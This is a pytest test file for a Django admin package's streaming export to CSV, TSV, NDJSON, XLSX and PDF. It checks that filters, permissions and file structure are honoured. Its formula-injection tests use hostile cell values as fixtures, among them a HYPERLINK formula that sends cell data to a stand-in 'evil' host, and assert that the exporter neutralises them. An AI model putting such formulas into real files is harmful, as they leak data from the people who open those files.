"""Export must hand back exactly what the page is showing, and must stream."""

import csv
import io
import re
import xml.etree.ElementTree as ET
import zipfile

import pytest
from django.contrib.auth.models import User
from django.http import StreamingHttpResponse
from django.urls import reverse

from tests.testapp.models import Author, Post

LIST = "vantage:testapp-post-list"


@pytest.fixture
def client_in(client, db):
    client.force_login(User.objects.create_superuser("boss", "b@example.com", "x"))
    return client


@pytest.fixture
def posts(db):
    ada = Author.objects.create(name="Ada", email="ada@example.com")
    grace = Author.objects.create(name="Grace", email="grace@example.com")
    Post.objects.create(title="Alpha", slug="a", body="b", author=ada, status="published")
    Post.objects.create(title="Beta", slug="b", body="b", author=grace, status="draft")
    Post.objects.create(title="Gamma", slug="g", body="b", author=ada, status="draft")


class InMemoryRows:
    """Unsaved instances served like a queryset, for values no column may hold.

    Real servers enforce ``max_length`` (MySQL, PostgreSQL) and PostgreSQL rejects NUL,
    so a value built to stress the export is kept off the database altogether.
    """

    def __init__(self, *rows):
        self.rows = list(rows)

    def count(self):
        return len(self.rows)

    def iterator(self, chunk_size=None):
        yield from self.rows


def body_of(response) -> bytes:
    return b"".join(response.streaming_content)


def sheet_cells(data: bytes) -> list[list[str]]:
    """Every row of the workbook's one sheet, parsed with the XML library."""
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert archive.testzip() is None
        root = ET.fromstring(archive.read("xl/worksheets/sheet1.xml"))
    ns = {"m": "http://schemas.openxmlformats.org/spreadsheetml/2006/main"}
    return [
        ["".join(t.text or "" for t in cell.iter(f"{{{ns['m']}}}t")) for cell in row]
        for row in root.iterfind(".//m:row", ns)
    ]


def text_of(response, fmt: str) -> str:
    data = body_of(response)
    if fmt == "xlsx":
        return "\n".join("\t".join(row) for row in sheet_cells(data))
    return data.decode("latin-1")


def read(response) -> list[list[str]]:
    body = b"".join(response.streaming_content).decode()
    return list(csv.reader(io.StringIO(body)))


class TestExport:
    def test_returns_a_streaming_response(self, client_in, posts):
        """A 400,000-row export must not be assembled in memory first."""
        response = client_in.get(reverse(LIST), {"export": "csv"})
        assert isinstance(response, StreamingHttpResponse)

    def test_is_offered_as_a_download(self, client_in, posts):
        response = client_in.get(reverse(LIST), {"export": "csv"})
        assert "attachment" in response["Content-Disposition"]
        assert ".csv" in response["Content-Disposition"]

    def test_is_not_cached(self, client_in, posts):
        """A permission-scoped extract must not sit in a shared cache."""
        response = client_in.get(reverse(LIST), {"export": "csv"})
        assert response["Cache-Control"] == "no-store"

    def test_first_row_is_the_column_headers(self, client_in, posts):
        rows = read(client_in.get(reverse(LIST), {"export": "csv"}))
        assert rows[0][0] == "Title"

    def test_columns_match_the_list_page(self, client_in, posts):
        rows = read(client_in.get(reverse(LIST), {"export": "csv"}))
        page = client_in.get(reverse(LIST))
        assert rows[0] == [c["label"] for c in page.context["columns"]]

    def test_exports_every_row_not_just_the_current_page(self, client_in, db):
        author = Author.objects.create(name="A", email="a@example.com")
        for i in range(60):
            Post.objects.create(title=f"P{i}", slug=f"p{i}", body="b", author=author)
        rows = read(client_in.get(reverse(LIST), {"export": "csv"}))
        assert len(rows) == 61  # 60 records plus the header

    def test_relations_export_as_their_label_not_a_primary_key(self, client_in, posts):
        rows = read(client_in.get(reverse(LIST), {"export": "csv"}))
        assert any("Ada" in row for row in rows[1:])


class TestExportRespectsTheView:
    def test_honours_the_active_search(self, client_in, posts):
        """An export that ignores your filters is worse than no export."""
        rows = read(client_in.get(reverse(LIST), {"export": "csv", "q": "Alpha"}))
        assert len(rows) == 2
        assert "Alpha" in rows[1]

    def test_honours_the_active_sort(self, client_in, posts):
        rows = read(client_in.get(reverse(LIST), {"export": "csv", "sort": "-title"}))
        assert [row[0] for row in rows[1:]] == ["Gamma", "Beta", "Alpha"]

    def test_honours_row_level_permissions(self, client_in, posts, monkeypatch):
        from vantage.permissions import PanelPermissions

        monkeypatch.setattr(
            PanelPermissions,
            "filter_queryset",
            lambda self, request, qs, action="view": qs.filter(status="published"),
        )
        rows = read(client_in.get(reverse(LIST), {"export": "csv"}))
        assert len(rows) == 2
        assert "Alpha" in rows[1]


class TestExportGuards:
    def test_an_unknown_format_renders_the_page_instead(self, client_in, posts):
        response = client_in.get(reverse(LIST), {"export": "xml"})
        assert response.status_code == 200
        assert not isinstance(response, StreamingHttpResponse)

    def test_export_requires_view_permission(self, client, db):
        staff = User.objects.create_user("plain", password="x", is_staff=True)
        client.force_login(staff)
        assert client.get(reverse(LIST), {"export": "csv"}).status_code == 403

    def test_empty_result_still_produces_headers(self, client_in, db):
        rows = read(client_in.get(reverse(LIST), {"export": "csv"}))
        assert len(rows) == 1
        assert rows[0][0] == "Title"

    def test_booleans_are_written_readably(self, client_in, posts):
        rows = read(client_in.get(reverse("vantage:testapp-author-list"), {"export": "csv"}))
        assert any("true" in row for row in rows[1:])


class TestOtherFormats:
    def test_json_streams_one_object_per_line(self, client_in, posts):
        """NDJSON, not one array: a streamed array cannot be closed if the queryset
        raises halfway, leaving a file that is silently truncated but parses as
        nothing. Every line here is independently parseable."""
        import json as jsonlib

        response = client_in.get(reverse(LIST), {"export": "json"})
        lines = b"".join(response.streaming_content).decode().strip().splitlines()
        assert len(lines) == 3
        assert jsonlib.loads(lines[0])["Title"] in {"Alpha", "Beta", "Gamma"}

    def test_json_is_offered_as_ndjson(self, client_in, posts):
        response = client_in.get(reverse(LIST), {"export": "json"})
        assert ".ndjson" in response["Content-Disposition"]
        assert response["Content-Type"] == "application/x-ndjson"

    def test_tsv_uses_tabs(self, client_in, posts):
        response = client_in.get(reverse(LIST), {"export": "tsv"})
        body = b"".join(response.streaming_content).decode()
        assert "\t" in body.splitlines()[0]

    def test_every_format_honours_the_active_search(self, client_in, posts):
        for fmt in ("csv", "tsv", "json", "xlsx", "pdf"):
            response = client_in.get(reverse(LIST), {"export": fmt, "q": "Alpha"})
            body = text_of(response, fmt)
            assert "Alpha" in body
            assert "Gamma" not in body, fmt

    def test_every_format_is_uncached(self, client_in, posts):
        for fmt in ("csv", "tsv", "json", "xlsx", "pdf"):
            response = client_in.get(reverse(LIST), {"export": fmt})
            assert response["Cache-Control"] == "no-store", fmt


class TestFormulaInjection:
    """A free-text cell that starts like a formula runs when the file is opened."""

    EVIL = '=HYPERLINK("http://evil/?"&A1,"x")'

    @pytest.fixture
    def hostile(self, db):
        ada = Author.objects.create(name=self.EVIL, email="ada@example.com")
        Post.objects.create(
            title="+SUM(1+1)",
            slug="p",
            body="b",
            author=ada,
            summary="@cmd",
            rating="-1.50",
            view_count=3,
        )

    def export(self, fmt, columns, headers=None):
        from vantage.export import stream_export

        response = stream_export(
            fmt, Post.objects.all(), columns, headers or columns, "f", masked=frozenset()
        )
        return b"".join(response.streaming_content).decode()

    def test_text_that_starts_like_a_formula_is_quoted(self, hostile):
        rows = list(csv.reader(io.StringIO(self.export("csv", ["title", "summary"]))))
        assert rows[1] == ["'+SUM(1+1)", "'@cmd"]

    @pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r"])
    def test_every_formula_lead_is_covered(self, db, lead):
        ada = Author.objects.create(name="Ada", email="ada@example.com")
        Post.objects.create(title=f"{lead}x", slug="l", body="b", author=ada)
        rows = list(csv.reader(io.StringIO(self.export("csv", ["title"]))))
        assert rows[1] == [f"'{lead}x"]

    def test_a_related_record_that_prints_as_a_formula_is_quoted(self, hostile):
        rows = list(csv.reader(io.StringIO(self.export("csv", ["author"]))))
        assert rows[1] == ["'" + self.EVIL]

    def test_numbers_stay_numbers(self, hostile):
        Post.objects.update(rating="-1.50")
        rows = list(csv.reader(io.StringIO(self.export("csv", ["rating", "view_count"]))))
        assert rows[1] == ["-1.50", "3"]

    def test_a_value_that_is_not_a_str_is_still_quoted(self):
        """Lazy strings and value objects print text too; only real data types pass."""
        import datetime as dt
        import uuid
        from decimal import Decimal

        from django.utils.functional import lazy

        from vantage.export import _cell

        class Money:
            def __str__(self):
                return "-SUM(A1:A9)"

        assert _cell(Money(), armoured=True) == "'-SUM(A1:A9)"
        assert _cell(lazy(lambda: "=cmd", str)(), armoured=True) == "'=cmd"
        for value, text in (
            (-3, "-3"),
            (-1.5, "-1.5"),
            (Decimal("-2.50"), "-2.50"),
            (dt.timedelta(days=-1), "-1 day, 0:00:00"),
            (uuid.UUID(int=0), "00000000-0000-0000-0000-000000000000"),
        ):
            assert _cell(value, armoured=True) == text

    def test_a_header_that_starts_like_a_formula_is_quoted(self, hostile):
        rows = list(csv.reader(io.StringIO(self.export("csv", ["title"], ["=Title"]))))
        assert rows[0] == ["'=Title"]

    def test_ordinary_text_is_untouched(self, posts):
        rows = list(csv.reader(io.StringIO(self.export("csv", ["title"]))))
        assert sorted(row[0] for row in rows[1:]) == ["Alpha", "Beta", "Gamma"]

    def test_tsv_shares_the_rule(self, hostile):
        assert "'+SUM(1+1)" in self.export("tsv", ["title"])

    def test_json_is_left_alone(self, hostile):
        # JSON is not opened in a spreadsheet, and a client parsing it wants the value.
        assert "+SUM(1+1)" in self.export("json", ["title"])
        assert "'+SUM" not in self.export("json", ["title"])

    def test_the_export_button_applies_it(self, client_in, hostile):
        response = client_in.get(reverse(LIST), {"export": "csv"})
        assert "'+SUM(1+1)" in b"".join(response.streaming_content).decode()


class TestWorkbook:
    def test_it_is_a_valid_workbook(self, client_in, posts):
        response = client_in.get(reverse(LIST), {"export": "xlsx"})
        assert response["Content-Type"] == (
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        )
        assert response["Content-Disposition"].endswith('.xlsx"')
        data = body_of(response)
        with zipfile.ZipFile(io.BytesIO(data)) as archive:
            names = set(archive.namelist())
            assert {"[Content_Types].xml", "_rels/.rels", "xl/workbook.xml"} <= names
            for name in names:
                ET.fromstring(archive.read(name))  # every part is well-formed XML
            types = archive.read("[Content_Types].xml").decode()
            assert "spreadsheetml.worksheet+xml" in types
        rows = sheet_cells(data)
        assert rows[0][0] == "Title"
        assert sorted(row[0] for row in rows[1:]) == ["Alpha", "Beta", "Gamma"]

    def test_it_has_the_same_cells_as_csv(self, client_in, posts):
        csv_rows = read(client_in.get(reverse(LIST), {"export": "csv", "sort": "title"}))
        xlsx_rows = sheet_cells(
            body_of(client_in.get(reverse(LIST), {"export": "xlsx", "sort": "title"}))
        )
        assert xlsx_rows == csv_rows

    def test_xml_special_and_control_characters_survive(self, client_in, db):
        author = Author.objects.create(name="Ada", email="ada@example.com")
        Post.objects.create(title="<b>&amp; \x01 \u00e9\u4e2d", slug="x", body="b", author=author)
        rows = sheet_cells(body_of(client_in.get(reverse(LIST), {"export": "xlsx"})))
        assert rows[1][0] == "<b>&amp;  \u00e9\u4e2d"

    def test_an_empty_list_still_has_its_header(self, client_in, db):
        rows = sheet_cells(body_of(client_in.get(reverse(LIST), {"export": "xlsx"})))
        assert len(rows) == 1 and rows[0][0] == "Title"


def pdf_objects(data: bytes) -> dict[int, int]:
    """Parse the xref table; check every offset lands on its ``N 0 obj``."""
    assert data.startswith(b"%PDF-1.")
    assert data.rstrip().endswith(b"%%EOF")
    start = int(re.search(rb"startxref\n(\d+)\n%%EOF", data).group(1))
    assert data[start : start + 4] == b"xref"
    lines = data[start:].split(b"\n")
    count = int(lines[1].split()[1])
    offsets = {}
    for number in range(1, count):
        offset = int(lines[2 + number].split()[0])
        assert data[offset:].startswith(b"%d 0 obj" % number), number
        offsets[number] = offset
    assert b"/Size %d" % count in data
    return offsets


class TestPdf:
    def test_structure_and_text(self, client_in, posts):
        response = client_in.get(reverse(LIST), {"export": "pdf"})
        assert response["Content-Type"] == "application/pdf"
        assert response["Content-Disposition"].endswith('.pdf"')
        data = body_of(response)
        pdf_objects(data)
        assert b"(Title)" in data and b"(Alpha)" in data and b"/Type /Page " in data

    def test_the_header_repeats_on_every_page_and_offsets_stay_valid(self, client_in, db):
        author = Author.objects.create(name="Ada", email="ada@example.com")
        Post.objects.bulk_create(
            [Post(title=f"Row {i}", slug=f"s{i}", body="b", author=author) for i in range(120)]
        )
        data = body_of(client_in.get(reverse(LIST), {"export": "pdf"}))
        pdf_objects(data)
        pages = data.count(b"/Type /Page ")
        assert pages > 1
        assert data.count(b"(Title)") == pages
        assert f"/Count {pages}".encode() in data
        assert b"(Row 119)" in data

    def test_special_and_foreign_text_cannot_break_the_file(self, client_in, db):
        author = Author.objects.create(name="Ada", email="ada@example.com")
        Post.objects.create(title="a(b)c\\d \u4e2d \u00e9", slug="x", body="b", author=author)
        data = body_of(client_in.get(reverse(LIST), {"export": "pdf"}))
        pdf_objects(data)
        assert b"(a\\(b\\)c\\\\d ? \xe9)" in data

    def test_a_cell_longer_than_its_column_is_cut(self):
        from vantage.export import stream_export

        rows = InMemoryRows(Post(title="w" * 500))
        data = body_of(stream_export("pdf", rows, ["title"], ["Title"], "f"))
        pdf_objects(data)
        assert b"w" * 500 not in data and b"..." in data


class TestBinaryFormatsFollowTheRules:
    @pytest.mark.parametrize("fmt", ["xlsx", "pdf"])
    def test_formulas_are_neutralised_like_csv(self, db, fmt):
        from vantage.export import stream_export

        ada = Author.objects.create(name="Ada", email="ada@example.com")
        for i, lead in enumerate("=+-@"):
            Post.objects.create(title=f"{lead}cmd{i}", slug=f"f{i}", body="b", author=ada)
        response = stream_export(
            fmt, Post.objects.order_by("pk"), ["title"], ["=Title"], "f", masked=frozenset()
        )
        text = text_of(response, fmt)
        for i, lead in enumerate("=+-@"):
            assert f"'{lead}cmd{i}" in text
        assert "'=Title" in text
        if fmt == "xlsx":
            assert not any(
                cell[:1] in "=+-@" for row in text.split("\n") for cell in row.split("\t") if cell
            )

    @pytest.mark.parametrize("fmt", ["xlsx", "pdf"])
    def test_view_permission_is_required(self, client, db, fmt):
        client.force_login(User.objects.create_user("plain", password="x", is_staff=True))
        assert client.get(reverse(LIST), {"export": fmt}).status_code == 403

    @pytest.mark.parametrize("fmt", ["xlsx", "pdf"])
    def test_the_permission_row_filter_applies(self, client_in, posts, monkeypatch, fmt):
        from vantage.permissions import PanelPermissions

        monkeypatch.setattr(
            PanelPermissions,
            "filter_queryset",
            lambda self, request, qs, action="view": qs.filter(status="published"),
        )
        text = text_of(client_in.get(reverse(LIST), {"export": fmt}), fmt)
        assert "Alpha" in text and "Beta" not in text and "Gamma" not in text


def test_the_export_menu_offers_every_format_and_carries_the_filters(client_in, posts):
    """One link per export.FORMATS entry, each with the list's own querystring."""
    from vantage.export import FORMATS

    page = client_in.get(reverse(LIST), {"status": "draft", "q": "ab", "sort": "-id"}).content
    page = page.decode()
    for fmt in FORMATS:
        assert f"export={fmt}" in page
    assert "Excel (.xlsx)" in page and ">PDF</a>" in page
    xlsx = next(line for line in page.splitlines() if "export=xlsx" in line)
    assert "status=draft" in xlsx and "q=ab" in xlsx and "sort=-id" in xlsx
    assert "page=" not in xlsx
